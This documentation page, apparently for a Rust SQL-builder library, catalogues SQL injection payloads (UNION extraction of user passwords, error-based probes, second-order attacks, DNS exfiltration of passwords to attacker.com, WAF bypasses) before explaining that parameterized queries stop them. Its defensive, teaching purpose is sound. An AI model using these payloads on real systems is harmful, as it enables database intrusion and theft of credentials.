---
sidebar_position: 4
---

# Advanced SQL Injection Techniques

Beyond basic SQL injection, attackers employ sophisticated techniques to
extract data and evade detection.

## UNION-Based SQL Injection

UNION attacks combine results from the original query with data from other
tables.

### Step 1: Determine Column Count

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   (error means there are 2 columns)

-- Using UNION SELECT NULL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Step 2: Find String-Compatible Columns

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Step 3: Extract Data

```sql
-- Extract usernames and passwords
' UNION SELECT NULL,username,password FROM users--

-- Extract table names
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

-- Extract column names
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns
  WHERE table_name='users'--
```

### Database-Specific Syntax

```sql
-- Oracle requires FROM DUAL for SELECT
' UNION SELECT NULL FROM dual--

-- Oracle uses different metadata tables
' UNION SELECT NULL,table_name FROM all_tables--
```

## Error-Based SQL Injection

Exploits error messages to extract data. Works when errors are displayed to
users.

### MySQL XPATH Techniques

```sql
-- Using EXTRACTVALUE (MySQL 5.1+)
' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--

-- Using UPDATEXML
' AND UPDATEXML(1, CONCAT(0x7e, USER()), 1)--

-- Extract table names
' AND EXTRACTVALUE(1, CONCAT(0x7e,
    (SELECT table_name FROM information_schema.tables LIMIT 1)))--
```

### PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS INT)--
```

### SQL Server

```sql
' AND 1=CONVERT(int, @@version)--
```

## Second-Order SQL Injection

Malicious payloads are stored by one application component and later executed
by another.

### Classic Example: Password Change Attack

1. Attacker registers with username: `administrator'--`
2. Application safely stores this in the database
3. During password change:

```sql
UPDATE users SET password='newpass' WHERE username='administrator'--'
```

4. The comment truncates the WHERE clause, changing the admin's password

### Why It's Dangerous

- Data safely escaped on insert becomes dangerous when reused
- Developers often only sanitize at entry points
- The vulnerability doesn't trigger immediately, making detection harder

## Out-of-Band SQL Injection

Data is exfiltrated through external channels (DNS, HTTP) when in-band methods
aren't possible.

### DNS Exfiltration

**Microsoft SQL Server:**

```sql
EXEC master.dbo.xp_dirtree '\\attacker.com\data'

-- Exfiltrate data via subdomain
EXEC master.dbo.xp_dirtree '\\' +
  (SELECT TOP 1 password FROM users) + '.attacker.com\a'
```

**MySQL:**

```sql
SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))
```

### DNS Limitations

- Maximum 127 subdomains per domain name
- Maximum 63 characters per subdomain
- Maximum 253 characters for full domain name
- Data transmitted in plaintext

## WAF Bypass Techniques

Web Application Firewalls (WAFs) attempt to block SQL injection but can often
be bypassed.

### Common Bypass Methods

1. **Case Manipulation**: `SeLeCt`, `UnIoN`
2. **Comment Insertion**: `SEL/**/ECT`, `UN/**/ION`
3. **URL Encoding**: `%53%45%4c%45%43%54`
4. **Unicode Encoding**: `SELECT` → `﹕ELECT`
5. **Keyword Nesting**: `UNunionION SEselectLECT`

### JSON-Based Bypass (2022)

```json
{"id": 1, "OR 1=1--": 1}
```

Some WAFs didn't recognize SQL within JSON payloads.

## How Oxide SQL Protects Against These

All of these advanced techniques are prevented by parameterized queries. The
SQL structure is fixed at compile time, and user input can never modify the
query structure -- UNION attack payloads, error-based probes, and other
malicious input are all treated as literal text.

See the [builder module rustdoc](pathname:///oxide-sql/rustdoc/oxide_sql_core/builder/) for
examples.

## References

- [PortSwigger UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [Offensive360 Second-Order SQL Injection](https://offensive360.com/second-order-sql-injection-attack/)
- [Invicti Out-of-Band SQL Injection](https://www.invicti.com/learn/out-of-band-sql-injection-oob-sqli/)
